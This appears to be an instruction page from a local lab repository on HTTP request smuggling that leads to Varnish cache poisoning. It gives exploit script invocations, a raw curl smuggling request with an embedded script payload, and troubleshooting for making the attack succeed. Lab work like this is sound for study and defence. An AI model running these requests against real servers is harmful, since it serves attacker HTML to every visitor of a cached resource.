# Attack Execution

## Goal

Poison a cacheable resource so that any request for `/js/app.js?cb=<key>` returns attacker-controlled HTML instead of legitimate JavaScript.

---

## Prerequisites

- Stack running in **vulnerable mode** (see [README](../README.md#-quick-start-attack-mode))
- Python venv active (`source .venv/bin/activate`)

---

## Recommended Workflow

### 1. Ensure the Stack is in Vulnerable Mode

```bash
cp vulnerable_configs/nginx.conf nginx/nginx.conf
cp vulnerable_configs/default.vcl varnish/default.vcl
docker compose down && docker compose up --build -d
docker compose ps   # all 4 containers should show "Up"
```

### 2. Optional Baseline Checks (safe reads)

```bash
curl -i http://localhost/                          # stack health check
curl -i "http://localhost/reflect?q=hello"         # confirm /reflect echoes back
curl -i "http://localhost/js/app.js?cb=demo1"      # confirm legitimate JS (X-Cache: MISS)
```

> **Do not** request `/js/app.js?cb=demo1` more than once before the attack, or the cache will already be warm and the exploit will fail for that key.

### 3. Run the Exploit

```bash
# Always use a fresh ?cb= key to guarantee a cold cache
python exploit/attack.py \
  --host localhost \
  --port 80 \
  --target-path "/js/app.js?cb=demo1"
```

Or with a custom payload:

```bash
python exploit/attack.py \
  --host localhost \
  --port 80 \
  --target-path "/js/app.js?cb=demo2" \
  --payload "<script>alert('owned')</script>"
```

Or with a timestamp-based unique cache key to always be safe:

```bash
python exploit/attack.py \
  --host localhost \
  --port 80 \
  --target-path "/js/app.js?cb=$(date +%s)"
```

### 4. Verify the Poisoned Response

```bash
curl -i "http://localhost/js/app.js?cb=demo1"
```

**Successful indicators:**

| Header / Field | Expected value |
|---|---|
| `X-Cache` | `HIT` — served from Varnish cache |
| `Content-Type` | `text/html` — not `application/javascript` |
| `Via` | `1.1 varnish-v4` |
| Body | `<html><body><script>alert('Cache Poisoned!')</script></body></html>` |

---

## Manual curl Step-by-Step

For educational purposes, the following replicates each phase without the Python script.

### Phase 1 — Plant the smuggled prefix

```bash
curl -v \
  --http1.1 \
  -X POST \
  -H "Host: localhost" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Content-Length: 153" \
  -H "Transfer_Encoding: chunked" \
  -H "Connection: keep-alive" \
  --data-binary $'6\r\nCLTE=1\r\n0\r\n\r\nGET /reflect?q=%3Cscript%3Ealert%28%27Cache%20Poisoned%21%27%29%3C%2Fscript%3E HTTP/1.1\r\nHost: localhost\r\nContent-Length: 500\r\nX-Ignore: ' \
  http://localhost/reflect
```

Expected: `200 OK` with `<html><body></body></html>` — the backend processed `/reflect` with no `q` param, but the smuggled `GET /reflect?q=<payload>` prefix is now parked in the backend socket buffer.

### Phase 2 — Trigger the cache miss (same connection)

```bash
curl -v \
  --http1.1 \
  -H "Host: localhost" \
  -H "Connection: keep-alive" \
  "http://localhost/js/app.js?cb=demo1"
```

Expected: the trigger reaches Varnish (MISS), Varnish forwards to backend, backend reads the smuggled prefix from the socket buffer, returns attacker HTML, Varnish caches it.

> ⚠️ Phase 1 and Phase 2 **must share the same TCP connection** for the attack to work. The Python script does this via raw socket management. With `curl` the connection reuse is not guaranteed across separate invocations.

### Phase 3 — Confirm cache is poisoned (new connection)

```bash
curl -i "http://localhost/js/app.js?cb=demo1"
```

If `X-Cache: HIT` and the body contains the payload, the attack succeeded.

---

## What the Script Does Internally

| Phase | Action |
|---|---|
| 0 | Probes for HTTP/2 support (informational — reveals H2.CL desync surface if present) |
| 1 | Sends a crafted `POST /reflect` with `Content-Length: 153` and `Transfer_Encoding: chunked`; body embeds the smuggled `GET /reflect?q=<payload>` prefix after the `0\r\n\r\n` terminator |
| 2 | On the **same raw TCP socket**, sends `GET /js/app.js?cb=<key>` to trigger a Varnish cache miss backed by the poisoned origin response |
| 3 | Opens a **new TCP connection**, fetches the same path, and checks whether it is now served with `X-Cache: HIT` and the attacker's payload in the body |

---

## Common Failure Cases

### Cache was already warm

**Symptom:** Script reports `[~] Cache HIT but payload not detected`.

**Fix:**

```bash
# Option A: use a new cache key
python exploit/attack.py --target-path "/js/app.js?cb=$(date +%s)"

# Option B: flush the cache layer entirely
docker compose restart cache-layer
```

### `[-] Cache poisoning did not produce expected response` (empty Phase 3)

**Cause:** Phase 1 and Phase 2 did not share the same TCP connection, so the smuggled bytes were discarded.

**Fix:** Use `exploit/attack.py` instead of bare `curl`, which manages the raw socket explicitly.

### `400 Bad Request` on Phase 1 attack POST

**Cause:** Mitigation configs are active — the dual-header detection fired.

**Fix:**

```bash
cp vulnerable_configs/nginx.conf nginx/nginx.conf
cp vulnerable_configs/default.vcl varnish/default.vcl
docker compose down && docker compose up --build -d
```

### `503 Backend fetch failed` cached in Phase 3

**Cause:** The backend crashed due to a corrupted socket (leftover bytes from a previous request). This usually happens if TE was stripped but `Content-Length` body wasn't drained.

**Fix:**

```bash
docker compose restart backend-origin
```

### Need real-time visibility

```bash
docker compose logs -f frontend-proxy cache-layer backend-origin
```
